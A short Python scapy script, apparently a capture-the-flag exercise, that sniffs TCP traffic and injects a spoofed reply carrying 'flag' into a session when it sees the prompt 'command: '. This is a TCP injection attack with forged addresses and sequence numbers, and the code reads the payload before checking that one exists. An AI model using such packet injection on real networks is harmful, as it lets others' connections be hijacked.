from scapy.all import *



while True:
    a = sniff(filter="tcp", count=1)
    print(a[0][Raw].load)
    if Raw in a[0] and a[0][Raw].load == b"command: ":
        
        print("yay")
        send(IP(src=a[0][IP].dst, dst=a[0][IP].src)/TCP(sport=a[0][TCP].dport, dport=a[0][TCP].sport, flags="PA", seq=a[0][TCP].ack, ack=a[0][TCP].seq+len(a[0][Raw].load))/Raw(load=b"flag"))

    else:
        send(a[0][IP]/a[0][TCP])
